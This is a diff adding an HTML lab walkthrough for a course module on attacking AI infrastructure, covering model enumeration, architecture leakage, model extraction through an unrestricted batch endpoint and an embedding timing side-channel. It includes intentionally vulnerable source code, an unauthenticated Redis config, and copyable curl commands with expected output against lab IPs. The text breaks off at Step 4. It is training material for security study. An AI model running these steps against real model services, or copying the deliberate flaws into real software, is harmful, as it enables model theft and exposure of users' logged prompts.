@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: AI Infrastructure Attacks | OSAI+ Lab Walkthrough</title>
+<style>
+  :root { --bg: #0d1117; --bg-secondary: #161b22; --bg-tertiary: #1c2333; --border: #30363d; --text: #e6edf3; --text-muted: #8b949e; --accent-red: #f85149; --accent-orange: #d29922; --accent-green: #3fb950; --accent-blue: #58a6ff; --accent-purple: #bc8cff; --accent-cyan: #39d2c0; --code-bg: #0d1117; --highlight: #1f2a37; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; padding: 2rem; max-width: 1100px; margin: 0 auto; }
+  h1 { font-size: 2.2rem; border-bottom: 2px solid var(--accent-red); padding-bottom: 0.8rem; margin-bottom: 0.5rem; color: var(--accent-red); }
+  .subtitle { color: var(--text-muted); font-size: 1.1rem; margin-bottom: 2.5rem; }
+  h2 { font-size: 1.6rem; color: var(--accent-orange); margin-top: 3rem; margin-bottom: 1rem; padding-bottom: 0.4rem; border-bottom: 1px solid var(--border); }
+  h3 { font-size: 1.2rem; color: var(--accent-blue); margin-top: 2rem; margin-bottom: 0.8rem; }
+  h4 { font-size: 1rem; color: var(--accent-purple); margin-top: 1.5rem; margin-bottom: 0.5rem; }
+  p { margin-bottom: 1rem; } a { color: var(--accent-blue); text-decoration: none; } a:hover { text-decoration: underline; }
+  .toc { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem 2rem; margin-bottom: 2.5rem; }
+  .toc h3 { margin-top: 0; color: var(--text); } .toc ol { padding-left: 1.5rem; } .toc li { margin-bottom: 0.4rem; } .toc a { color: var(--accent-cyan); }
+  .info-box { border-left: 4px solid; padding: 1rem 1.5rem; margin: 1.5rem 0; border-radius: 0 8px 8px 0; background: var(--bg-secondary); }
+  .info-box.concept { border-color: var(--accent-blue); } .info-box.warning { border-color: var(--accent-orange); } .info-box.danger { border-color: var(--accent-red); } .info-box.business { border-color: var(--accent-purple); } .info-box.success { border-color: var(--accent-green); }
+  .info-box .label { font-weight: 700; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.3rem; }
+  .info-box.concept .label { color: var(--accent-blue); } .info-box.warning .label { color: var(--accent-orange); } .info-box.danger .label { color: var(--accent-red); } .info-box.business .label { color: var(--accent-purple); } .info-box.success .label { color: var(--accent-green); }
+  .code-block { position: relative; background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; margin: 1rem 0 1.5rem 0; overflow: hidden; }
+  .code-header { display: flex; justify-content: space-between; align-items: center; background: var(--bg-tertiary); padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid var(--border); }
+  .copy-btn { background: var(--bg-secondary); color: var(--accent-green); border: 1px solid var(--border); padding: 0.25rem 0.75rem; border-radius: 4px; cursor: pointer; font-size: 0.8rem; transition: all 0.2s; }
+  .copy-btn:hover { background: var(--accent-green); color: var(--bg); }
+  .code-block pre { padding: 1rem 1.2rem; overflow-x: auto; font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace; font-size: 0.9rem; line-height: 1.6; white-space: pre; }
+  .code-block code { font-family: inherit; }
+  .diagram { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; font-family: 'JetBrains Mono', 'Fira Code', monospace; font-size: 0.85rem; line-height: 1.5; overflow-x: auto; white-space: pre; color: var(--accent-cyan); }
+  .source-code { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.2rem; margin: 1rem 0; font-family: 'JetBrains Mono', 'Fira Code', monospace; font-size: 0.85rem; line-height: 1.6; overflow-x: auto; }
+  .source-code .vuln-line { background: rgba(248, 81, 73, 0.15); display: block; margin: 0 -1.2rem; padding: 0 1.2rem; }
+  .line-num { color: var(--text-muted); user-select: none; display: inline-block; width: 2.5rem; text-align: right; margin-right: 1rem; }
+  table { width: 100%; border-collapse: collapse; margin: 1rem 0 1.5rem 0; font-size: 0.95rem; }
+  th, td { padding: 0.7rem 1rem; border: 1px solid var(--border); text-align: left; }
+  th { background: var(--bg-tertiary); color: var(--accent-cyan); font-weight: 600; } td { background: var(--bg-secondary); } tr:hover td { background: var(--highlight); }
+  .tag { display: inline-block; padding: 0.15rem 0.6rem; border-radius: 12px; font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.04em; }
+  .tag.critical { background: rgba(248,81,73,0.2); color: var(--accent-red); } .tag.high { background: rgba(210,153,34,0.2); color: var(--accent-orange); } .tag.medium { background: rgba(88,166,255,0.2); color: var(--accent-blue); }
+  hr { border: none; border-top: 1px solid var(--border); margin: 3rem 0; }
+  .step-num { display: inline-flex; align-items: center; justify-content: center; width: 2rem; height: 2rem; background: var(--accent-red); color: var(--bg); border-radius: 50%; font-weight: 700; font-size: 0.9rem; margin-right: 0.7rem; flex-shrink: 0; }
+  .step-title { display: flex; align-items: center; font-size: 1.3rem; color: var(--text); margin-top: 2.5rem; margin-bottom: 1rem; }
+  ul, ol { margin-bottom: 1rem; padding-left: 1.5rem; } li { margin-bottom: 0.3rem; }
+  .footer { margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--border); color: var(--text-muted); font-size: 0.85rem; text-align: center; }
+  code { background: var(--bg-tertiary); padding: 0.15rem 0.4rem; border-radius: 4px; font-family: 'JetBrains Mono', 'Fira Code', monospace; font-size: 0.88em; }
+  .comment { color: var(--text-muted); font-style: italic; } .string { color: var(--accent-orange); } .key { color: var(--accent-purple); }
+  .expected-output { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem 0; font-family: 'JetBrains Mono', 'Fira Code', monospace; font-size: 0.82rem; line-height: 1.5; overflow-x: auto; color: var(--text-muted); }
+  .expected-label { font-size: 0.8rem; color: var(--accent-green); font-weight: 600; margin-bottom: 0.3rem; text-transform: uppercase; letter-spacing: 0.04em; }
+</style>
+<script>
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  navigator.clipboard.writeText(pre.textContent).then(() => {
+    btn.textContent = 'Copied!'; btn.style.borderColor = '#3fb950';
+    setTimeout(() => { btn.textContent = 'Copy'; btn.style.borderColor = ''; }, 2000);
+  });
+}
+</script>
+</head>
+<body>
+
+<h1>Module 5: AI Infrastructure Attacks</h1>
+<p class="subtitle">Model Extraction, Timing Side-Channels, Cache Poisoning, Query Log Exposure &amp; Unauthenticated Redis Exploitation</p>
+
+<div class="toc">
+  <h3>Contents</h3>
+  <ol>
+    <li><a href="#overview">What is AI Infrastructure and Why Does It Matter?</a></li>
+    <li><a href="#architecture">Architecture &amp; Attack Surface</a></li>
+    <li><a href="#source-analysis">Vulnerable Source Code Analysis</a></li>
+    <li><a href="#step1">Step 1 &mdash; Service Reconnaissance &amp; Model Enumeration</a></li>
+    <li><a href="#step2">Step 2 &mdash; Model Architecture Leakage</a></li>
+    <li><a href="#step3">Step 3 &mdash; Model Extraction via Unrestricted Inference</a></li>
+    <li><a href="#step4">Step 4 &mdash; Timing Side-Channel (Embedding Oracle)</a></li>
+    <li><a href="#step5">Step 5 &mdash; Embedding Cache Poisoning</a></li>
+    <li><a href="#step6">Step 6 &mdash; Query Log Exposure via Stats API</a></li>
+    <li><a href="#step7">Step 7 &mdash; Direct Redis Exploitation</a></li>
+    <li><a href="#step8">Step 8 &mdash; Redis Log Injection &amp; Audit Tampering</a></li>
+    <li><a href="#chaining">Advanced: Attack Chaining</a></li>
+    <li><a href="#mitigations">Defensive Mitigations</a></li>
+    <li><a href="#osai-topics">OSAI+ Exam Topics Covered</a></li>
+  </ol>
+</div>
+
+<!-- ═══════════════════════════════════════════ SECTION 1 ═══════════════════════════════════════════ -->
+<h2 id="overview">1. What is AI Infrastructure and Why Does It Matter?</h2>
+
+<p>AI infrastructure refers to the underlying services that support model inference, embedding generation, caching, and data pipelines in production AI systems. While attackers often focus on the AI models themselves (prompt injection, adversarial inputs), the <strong>infrastructure layer</strong> frequently contains the most devastating vulnerabilities because it operates with implicit trust and minimal security controls.</p>
+
+<p>This module targets three interconnected services that represent a common production AI stack:</p>
+
+<ul>
+  <li><strong>Model API</strong> &mdash; A proxy/gateway that wraps the underlying LLM (Ollama) and adds logging, statistics, and batch processing. In production, this is the customer-facing inference endpoint.</li>
+  <li><strong>Embedding Service</strong> &mdash; Generates vector embeddings for text, used by RAG pipelines, search, and similarity calculations. Caches results in Redis for performance.</li>
+  <li><strong>Redis</strong> &mdash; The shared caching and logging backend. Stores embeddings, inference logs, and application state. Exposed without authentication.</li>
+</ul>
+
+<div class="info-box business">
+  <div class="label">Business Context</div>
+  These services form the core of any AI-powered product. An attacker who compromises this layer can: extract proprietary models (IP theft worth millions), poison cached embeddings to corrupt downstream RAG/search results (data integrity), exfiltrate user queries containing PII or trade secrets (data breach), and manipulate audit logs to cover their tracks (compliance violation). The 2024 attack on Hugging Face's infrastructure demonstrated that AI infrastructure is a prime target, with API tokens and model weights being the most valuable assets.
+</div>
+
+<div class="info-box concept">
+  <div class="label">Key Concepts</div>
+  <strong>Model Extraction</strong>: Systematically querying a model to replicate its behavior, effectively stealing the model without direct access to weights. <strong>Timing Side-Channel</strong>: Using response time differences to infer internal state (e.g., whether data is cached). <strong>Cache Poisoning</strong>: Injecting malicious data into a cache so downstream consumers receive corrupted results. <strong>Embedding Inversion</strong>: Recovering original text from its vector embedding, potentially exposing sensitive inputs.
+</div>
+
+<!-- ═══════════════════════════════════════════ SECTION 2 ═══════════════════════════════════════════ -->
+<h2 id="architecture">2. Architecture &amp; Attack Surface</h2>
+
+<div class="diagram">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        AI Infrastructure Module                            │
+│                                                                             │
+│  ┌──────────────────┐    ┌──────────────────────┐    ┌──────────────────┐   │
+│  │   Model API      │    │  Embedding Service    │    │     Redis        │   │
+│  │   :8009           │    │  :8010                │    │     :6379        │   │
+│  │  192.168.100.60   │    │  192.168.100.61       │    │  192.168.100.62  │   │
+│  │                   │    │                       │    │                  │   │
+│  │  /inference       │    │  /embed               │    │  NO AUTH         │   │
+│  │  /batch           │    │  /embed/batch         │    │  Full R/W        │   │
+│  │  /models          │    │  /similarity          │    │  All commands    │   │
+│  │  /model/{n}/info  │    │  /cache/dump          │    │                  │   │
+│  │  /stats           │    │  /cache/set           │    │                  │   │
+│  └────────┬─────────┘    └──────────┬────────────┘    └────────▲─────────┘   │
+│           │                         │                          │              │
+│           │    ┌────────────────────┘──────────────────────────┘              │
+│           │    │                     │                                        │
+│           ▼    ▼                     ▼                                        │
+│  ┌──────────────────┐    ┌──────────────────────┐                            │
+│  │    Ollama LLM     │    │   Writes/Reads        │                            │
+│  │    :11434          │    │   inference_log       │                            │
+│  │  192.168.100.22   │    │   emb:* cache keys    │                            │
+│  └──────────────────┘    └──────────────────────┘                            │
+│                                                                             │
+│  Kali Attacker: 192.168.19.128 ──▶ 192.168.19.1:<port>                      │
+└─────────────────────────────────────────────────────────────────────────────┘
+</div>
+
+<h3>Endpoint Map</h3>
+<table>
+  <tr><th>Service</th><th>Port</th><th>Endpoint</th><th>Method</th><th>Vulnerability</th><th>Severity</th></tr>
+  <tr><td>Model API</td><td>8009</td><td><code>/models</code></td><td>GET</td><td>Exposes all model names, sizes, families, quantization</td><td><span class="tag high">High</span></td></tr>
+  <tr><td>Model API</td><td>8009</td><td><code>/model/{name}/info</code></td><td>GET</td><td>Leaks full architecture: layers, heads, context length, tensor shapes</td><td><span class="tag critical">Critical</span></td></tr>
+  <tr><td>Model API</td><td>8009</td><td><code>/inference</code></td><td>POST</td><td>No auth, no rate limit, logs all inputs to Redis, leaks timing</td><td><span class="tag critical">Critical</span></td></tr>
+  <tr><td>Model API</td><td>8009</td><td><code>/batch</code></td><td>POST</td><td>Batch queries without rate limiting &mdash; efficient model extraction</td><td><span class="tag critical">Critical</span></td></tr>
+  <tr><td>Model API</td><td>8009</td><td><code>/stats</code></td><td>GET</td><td>Dumps all logged prompts with timestamps from Redis</td><td><span class="tag critical">Critical</span></td></tr>
+  <tr><td>Embedding</td><td>8010</td><td><code>/embed</code></td><td>POST</td><td>No rate limit, timing oracle (cached vs uncached), no auth</td><td><span class="tag high">High</span></td></tr>
+  <tr><td>Embedding</td><td>8010</td><td><code>/embed/batch</code></td><td>POST</td><td>Bulk embedding extraction for embedding space mapping</td><td><span class="tag high">High</span></td></tr>
+  <tr><td>Embedding</td><td>8010</td><td><code>/similarity</code></td><td>POST</td><td>Compare arbitrary texts &mdash; aids adversarial input crafting</td><td><span class="tag medium">Medium</span></td></tr>
+  <tr><td>Embedding</td><td>8010</td><td><code>/cache/dump</code></td><td>GET</td><td>Dumps all cached embeddings &mdash; enables inversion attacks</td><td><span class="tag critical">Critical</span></td></tr>
+  <tr><td>Embedding</td><td>8010</td><td><code>/cache/set</code></td><td>POST</td><td>Direct cache write &mdash; full cache poisoning</td><td><span class="tag critical">Critical</span></td></tr>
+  <tr><td>Redis</td><td>6379</td><td>N/A (protocol)</td><td>TCP</td><td>No authentication, full read/write, all commands enabled</td><td><span class="tag critical">Critical</span></td></tr>
+</table>
+
+<!-- ═══════════════════════════════════════════ SECTION 3 ═══════════════════════════════════════════ -->
+<h2 id="source-analysis">3. Vulnerable Source Code Analysis</h2>
+
+<h3>Model API &mdash; <code>targets/infra/model-api/app.py</code></h3>
+
+<div class="source-code">
+<span class="line-num">1</span><span class="comment"># Model Inference API - intentionally vulnerable</span>
+<span class="line-num">2</span><span class="comment"># Vulns: model info leakage, no rate limiting, input logging,</span>
+<span class="line-num">3</span><span class="comment">#        no auth, model extraction, adversarial input acceptance</span>
+<span class="line-num">4</span>
+<span class="line-num">5</span>@app.post(<span class="string">"/inference"</span>)
+<span class="line-num">6</span>async def inference(payload: dict):
+<span class="vuln-line"><span class="line-num">7</span>    prompt = payload.get(<span class="string">"prompt"</span>, <span class="string">""</span>)        <span class="comment"># VULN: No input validation</span></span>
+<span class="line-num">8</span>    model = payload.get(<span class="string">"model"</span>, <span class="string">"llama3"</span>)
+<span class="line-num">9</span>
+<span class="vuln-line"><span class="line-num">10</span>    logger.info(f<span class="string">"Inference request: model={model} prompt={prompt[:100]}"</span>)  <span class="comment"># VULN: Logs to stdout</span></span>
+<span class="line-num">11</span>
+<span class="vuln-line"><span class="line-num">12</span>    <span class="comment"># VULN: Log ALL inputs to Redis (data exposure if Redis is accessed)</span></span>
+<span class="vuln-line"><span class="line-num">13</span>    if redis_client:</span>
+<span class="vuln-line"><span class="line-num">14</span>        redis_client.lpush(<span class="string">"inference_log"</span>,</span>
+<span class="vuln-line"><span class="line-num">15</span>            json.dumps({<span class="string">"prompt"</span>: prompt, <span class="string">"model"</span>: model,</span>
+<span class="vuln-line"><span class="line-num">16</span>                        <span class="string">"timestamp"</span>: time.time()}))</span>
+<span class="line-num">17</span>
+<span class="line-num">18</span>    <span class="comment"># ... sends to Ollama, returns response with timing ...</span>
+<span class="line-num">19</span>    return {
+<span class="line-num">20</span>        <span class="string">"response"</span>: result.get(<span class="string">"response"</span>, <span class="string">""</span>),
+<span class="vuln-line"><span class="line-num">21</span>        <span class="string">"elapsed_ms"</span>: round(elapsed * 1000, 2),  <span class="comment"># VULN: timing info leaked</span></span>
+<span class="vuln-line"><span class="line-num">22</span>        <span class="string">"tokens"</span>: result.get(<span class="string">"eval_count"</span>, 0),    <span class="comment"># VULN: token counts leaked</span></span>
+<span class="vuln-line"><span class="line-num">23</span>        <span class="string">"prompt_tokens"</span>: result.get(<span class="string">"prompt_eval_count"</span>, 0),</span>
+<span class="line-num">24</span>    }
+</div>
+
+<p>Every single inference request is logged to Redis with the <strong>full prompt text</strong>. Anyone with Redis access can read every user query. The response also leaks token counts and timing data, which aids model extraction attacks.</p>
+
+<h3>Model API &mdash; Model Info Disclosure</h3>
+
+<div class="source-code">
+<span class="line-num">25</span>@app.get(<span class="string">"/models"</span>)
+<span class="line-num">26</span>async def list_models():
+<span class="vuln-line"><span class="line-num">27</span>    <span class="comment">"""VULN: Exposes all available models and their details"""</span></span>
+<span class="vuln-line"><span class="line-num">28</span>    resp = await client.get(f<span class="string">"{OLLAMA_URL}/api/tags"</span>)</span>
+<span class="vuln-line"><span class="line-num">29</span>    return resp.json()  <span class="comment"># Full model list with sizes, families, quantization</span></span>
+<span class="line-num">30</span>
+<span class="line-num">31</span>@app.get(<span class="string">"/model/{model_name}/info"</span>)
+<span class="line-num">32</span>async def model_info(model_name: str):
+<span class="vuln-line"><span class="line-num">33</span>    <span class="comment">"""VULN: Leaks model architecture, parameters, and configuration"""</span></span>
+<span class="vuln-line"><span class="line-num">34</span>    resp = await client.post(f<span class="string">"{OLLAMA_URL}/api/show"</span>, json={<span class="string">"name"</span>: model_name})</span>
+<span class="vuln-line"><span class="line-num">35</span>    return resp.json()  <span class="comment"># Architecture, tensor shapes, context length, vocab...</span></span>
+</div>
+
+<div class="info-box danger">
+  <div class="label">Critical Vulnerability</div>
+  The <code>/model/{name}/info</code> endpoint proxies Ollama's <code>/api/show</code> without any filtering. This leaks: model architecture (llama), parameter count (8 billion), quantization level (Q4_0), context length (8192), embedding dimensions (4096), attention head count (32/8), feed-forward layer size (14336), individual tensor names and shapes, the full Modelfile template, and even the license text. This is everything an attacker needs to replicate the model architecture or target it with architecture-specific adversarial attacks.
+</div>
+
+<h3>Embedding Service &mdash; <code>targets/infra/embedding-service/app.py</code></h3>
+
+<div class="source-code">
+<span class="line-num">1</span>@app.post(<span class="string">"/embed"</span>)
+<span class="line-num">2</span>async def embed(payload: dict):
+<span class="line-num">3</span>    text = payload.get(<span class="string">"text"</span>, <span class="string">""</span>)
+<span class="line-num">4</span>    cache_key = f<span class="string">"emb:{hashlib.sha256(f'{model}:{text}'.encode()).hexdigest()}"</span>
+<span class="line-num">5</span>
+<span class="vuln-line"><span class="line-num">6</span>    if CACHE_EMBEDDINGS and redis_client:</span>
+<span class="vuln-line"><span class="line-num">7</span>        cached = redis_client.get(cache_key)</span>
+<span class="vuln-line"><span class="line-num">8</span>        if cached:  <span class="comment"># VULN: Cache hit returns in ~1ms vs ~400ms uncached</span></span>
+<span class="vuln-line"><span class="line-num">9</span>            return {<span class="string">"embedding"</span>: embedding, <span class="string">"elapsed_ms"</span>: ..., <span class="string">"cached"</span>: True}</span>
+<span class="line-num">10</span>
+<span class="line-num">11</span>    <span class="comment"># Generate via Ollama (~400ms)</span>
+<span class="vuln-line"><span class="line-num">12</span>    redis_client.set(cache_key, json.dumps(embedding), ex=3600)  <span class="comment"># Cache for 1hr</span></span>
+<span class="line-num">13</span>    return {<span class="string">"embedding"</span>: embedding, <span class="string">"elapsed_ms"</span>: ..., <span class="string">"cached"</span>: False}
+<span class="line-num">14</span>
+<span class="line-num">15</span>
+<span class="line-num">16</span>@app.get(<span class="string">"/cache/dump"</span>)
+<span class="line-num">17</span>async def cache_dump():
+<span class="vuln-line"><span class="line-num">18</span>    <span class="comment">"""VULN: Dumps all cached embeddings - enables inversion attacks"""</span></span>
+<span class="vuln-line"><span class="line-num">19</span>    keys = redis_client.keys(<span class="string">"emb:*"</span>)</span>
+<span class="vuln-line"><span class="line-num">20</span>    for key in keys[:500]:  <span class="comment"># Returns up to 500 cached embedding vectors</span></span>
+<span class="vuln-line"><span class="line-num">21</span>        entries[key] = json.loads(redis_client.get(key))</span>
+<span class="line-num">22</span>
+<span class="line-num">23</span>
+<span class="line-num">24</span>@app.post(<span class="string">"/cache/set"</span>)
+<span class="line-num">25</span>async def cache_set(payload: dict):
+<span class="vuln-line"><span class="line-num">26</span>    <span class="comment">"""VULN: Direct cache write - enables cache poisoning"""</span></span>
+<span class="vuln-line"><span class="line-num">27</span>    cache_key = f<span class="string">"emb:{hashlib.sha256(...)}"</span></span>
+<span class="vuln-line"><span class="line-num">28</span>    redis_client.set(cache_key, json.dumps(embedding), ex=3600)  <span class="comment"># No auth check</span></span>
+</div>
+
+<div class="info-box warning">
+  <div class="label">Timing Oracle</div>
+  The <code>/embed</code> endpoint returns a <code>cached</code> boolean AND the <code>elapsed_ms</code> timing. Cache hits return in ~1ms while cache misses take ~400ms. Even without the explicit <code>cached</code> flag, the 400x timing difference is a reliable side-channel. An attacker can use this to determine whether specific text has been previously embedded &mdash; essentially probing what data has been processed by the system.
+</div>
+
+<h3>Redis &mdash; <code>docker-compose.yml</code></h3>
+
+<div class="source-code">
+<span class="line-num">1</span>redis:
+<span class="line-num">2</span>  image: redis:7-alpine
+<span class="vuln-line"><span class="line-num">3</span>  command: redis-server --requirepass ""  <span class="comment"># VULN: Empty password = no auth</span></span>
+<span class="line-num">4</span>  ports:
+<span class="vuln-line"><span class="line-num">5</span>    - "6379:6379"  <span class="comment"># VULN: Exposed to network</span></span>
+</div>
+
+<div class="info-box danger">
+  <div class="label">Critical: Unauthenticated Redis</div>
+  Redis is deployed with an empty password and exposed on port 6379. The ACL configuration is <code>user default on nopass ~* &amp;* +@all</code> &mdash; the default user has no password, can access all keys (<code>~*</code>), all pub/sub channels (<code>&amp;*</code>), and execute all commands (<code>+@all</code>). This includes <code>CONFIG</code>, <code>KEYS</code>, <code>FLUSHALL</code>, <code>DEBUG</code>, and <code>CLIENT LIST</code>. Full read/write access to everything both services store.
+</div>
+
+<!-- ═══════════════════════════════════════════ SECTION 4: ATTACKS ═══════════════════════════════════ -->
+<h2 id="step1">4. Attack Steps</h2>
+
+<!-- STEP 1 -->
+<div class="step-title" id="step1"><span class="step-num">1</span> Service Reconnaissance &amp; Model Enumeration</div>
+
+<p>Start by probing all three services and enumerating available models. This is the attacker's first move: understanding what's deployed and what's accessible.</p>
+
+<h4>Health Checks</h4>
+
+<div class="code-block"><div class="code-header"><span>Health probes</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s http://192.168.19.1:8009/health | python3 -m json.tool
+curl -s http://192.168.19.1:8010/health | python3 -m json.tool
+redis-cli -h 192.168.19.1 -p 6379 ping</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{"status": "ok", "service": "model-api"}
+{"status": "ok", "service": "embedding-service"}
+PONG</div>
+
+<h4>Enumerate Models</h4>
+
+<div class="code-block"><div class="code-header"><span>List available models</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s http://192.168.19.1:8009/models | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output (key fields)</div>
+<div class="expected-output">{
+  "models": [
+    {
+      "name": "mistral:latest",
+      "size": 4372824384,
+      "details": {
+        "family": "llama",
+        "parameter_size": "7.2B",
+        "quantization_level": "Q4_K_M"
+      }
+    },
+    {
+      "name": "llama3:latest",
+      "size": 4661224676,
+      "details": {
+        "family": "llama",
+        "parameter_size": "8.0B",
+        "quantization_level": "Q4_0"
+      }
+    }
+  ]
+}</div>
+
+<div class="info-box warning">
+  <div class="label">Intelligence Gathered</div>
+  From a single unauthenticated GET request, we know: two models are deployed (Mistral 7.2B and LLaMA 3 8B), both use the llama architecture family, exact quantization levels (Q4_K_M and Q4_0), and precise file sizes. This tells an attacker the exact model variants, which informs architecture-specific attacks, and the quantization levels, which affect the precision of model extraction.
+</div>
+
+<!-- STEP 2 -->
+<div class="step-title" id="step2"><span class="step-num">2</span> Model Architecture Leakage</div>
+
+<p>The <code>/model/{name}/info</code> endpoint exposes the complete model architecture. This is like giving an attacker the blueprint to the vault.</p>
+
+<div class="code-block"><div class="code-header"><span>Extract full model architecture</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s http://192.168.19.1:8009/model/llama3/info | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output (critical fields extracted)</div>
+<div class="expected-output">{
+  "modelfile": "FROM /root/.ollama/models/blobs/sha256-6a07...",
+  "parameters": "num_keep 24\nstop \"&lt;|start_header_id|&gt;\"\n...",
+  "template": "{{ if .System }}&lt;|start_header_id|&gt;system...",
+  "model_info": {
+    "general.architecture": "llama",
+    "general.parameter_count": 8030261248,
+    "llama.attention.head_count": 32,
+    "llama.attention.head_count_kv": 8,
+    "llama.block_count": 32,
+    "llama.context_length": 8192,
+    "llama.embedding_length": 4096,
+    "llama.feed_forward_length": 14336,
+    "llama.rope.dimension_count": 128,
+    "llama.rope.freq_base": 500000,
+    "llama.vocab_size": 128256
+  },
+  "tensors": [
+    {"name": "token_embd.weight", "type": "Q4_0", "shape": [4096, 128256]},
+    {"name": "blk.0.attn_norm.weight", "type": "F32", "shape": [4096]},
+    ...
+  ]
+}</div>
+
+<div class="info-box danger">
+  <div class="label">Critical Intelligence Disclosure</div>
+  This single response reveals:
+  <ul>
+    <li><strong>Architecture</strong>: 32 transformer blocks, 32 attention heads (8 KV), GQA (Grouped Query Attention)</li>
+    <li><strong>Dimensions</strong>: 4096 embedding, 14336 FFN, 128 RoPE dimension, 500k freq base</li>
+    <li><strong>Scale</strong>: 8.03 billion parameters, 128,256 vocab size, 8192 context window</li>
+    <li><strong>Prompt template</strong>: Exact chat format with header tokens &mdash; enables prompt injection</li>
+    <li><strong>File paths</strong>: Internal blob storage path revealing the model weight location</li>
+    <li><strong>Tensor layout</strong>: Every layer's name, data type, and shape &mdash; the complete neural network blueprint</li>
+  </ul>
+</div>
+
+<div class="info-box business">
+  <div class="label">Business Impact</div>
+  If this were a fine-tuned proprietary model (as most production models are), this disclosure would reveal the exact architecture modifications, custom prompt templates, and parameter choices that represent the company's competitive advantage. Combined with model extraction (Step 3), an attacker could replicate the entire system. Fine-tuning a LLaMA model can cost $50K-$500K in compute alone &mdash; this information makes theft trivial.
+</div>
+
+<!-- STEP 3 -->
+<div class="step-title" id="step3"><span class="step-num">3</span> Model Extraction via Unrestricted Inference</div>
+
+<p>With no authentication, no rate limiting, and a batch endpoint, an attacker can systematically query the model to build a training dataset for a clone. This is called <strong>model extraction</strong> or <strong>model stealing</strong>.</p>
+
+<h4>Single Inference Query</h4>
+
+<div class="code-block"><div class="code-header"><span>Query the model (note timing + token count in response)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8009/inference \
+  -H "Content-Type: application/json" \
+  -d '{"prompt": "What is 2+2?", "model": "llama3", "temperature": 0.1}' \
+  | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{
+  "response": "The answer to 2+2 is 4.",
+  "model": "llama3",
+  "elapsed_ms": 2600.5,
+  "tokens": 12,
+  "prompt_tokens": 17
+}</div>
+
+<p>The response includes <code>elapsed_ms</code>, <code>tokens</code>, and <code>prompt_tokens</code> &mdash; metadata that shouldn't be exposed. Token counts help attackers understand tokenization behavior, and timing data reveals inference performance characteristics.</p>
+
+<h4>Batch Model Extraction</h4>
+
+<div class="code-block"><div class="code-header"><span>Batch query &mdash; 2 prompts in a single request (scales to 50)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8009/batch \
+  -H "Content-Type: application/json" \
+  -d '{"prompts": ["What is 1+1?", "What is the capital of France?"], "model": "llama3"}' \
+  | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{
+  "model": "llama3",
+  "results": [
+    "The answer to 1+1 is 2.",
+    "The capital of France is Paris."
+  ],
+  "count": 2
+}</div>
+
+<div class="info-box concept">
+  <div class="label">Model Extraction Theory</div>
+  A model extraction attack works by: (1) generating a diverse set of prompts covering the model's knowledge domain, (2) collecting the model's responses via unrestricted API access, (3) using the prompt-response pairs as training data to fine-tune a smaller "student" model. The <code>/batch</code> endpoint accepts up to 50 prompts per request, making extraction highly efficient. Academic research (Tramer et al., 2016) showed that even simple models can be fully extracted with as few as O(d) queries where d is the model's dimension. For LLMs, practical extraction typically requires 10K-100K queries &mdash; easily achievable with no rate limit.
+</div>
+
+<div class="info-box business">
+  <div class="label">Business Impact</div>
+  Model extraction enables a competitor to replicate a company's AI capabilities without investing in training. For a fine-tuned model that cost $200K in compute and 6 months of prompt engineering, the attacker replicates it for the cost of API calls &mdash; potentially a few hundred dollars. This is intellectual property theft at industrial scale. The MITRE ATLAS framework classifies this as <strong>ML Model Access (AML.T0040)</strong>.
+</div>
+
+<!-- STEP 4 -->
+<div class="step-title" id="step4"><span class="step-num">4</span> Timing Side-Channel (Embedding Oracle)</div>
+
+<p>The embedding service reveals whether specific text has been previously processed through a <strong>timing side-channel</strong>. Cached embeddings return in ~1ms; uncached embeddings require Ollama computation (~400ms).</p>
+
+<h4>First Request (Uncached)</h4>
+
+<div class="code-block"><div class="code-header"><span>Generate embedding for new text (will be slow &mdash; uncached)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8010/embed \
+  -H "Content-Type: application/json" \
+  -d '{"text": "quarterly revenue projections for Q3", "model": "llama3"}' \
+  | python3 -c '
+import sys, json
+d = json.load(sys.stdin)
+print(f"cached: {d.get(\"cached\")}  elapsed_ms: {d.get(\"elapsed_ms\")}  dimensions: {d.get(\"dimensions\")}  embedding_length: {len(d.get(\"embedding\", []))}")
+'</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">cached: False  elapsed_ms: 426.53  dimensions: 4096  embedding_length: 4096</div>
+
+<h4>Second Request (Cached &mdash; Timing Oracle)</h4>
+
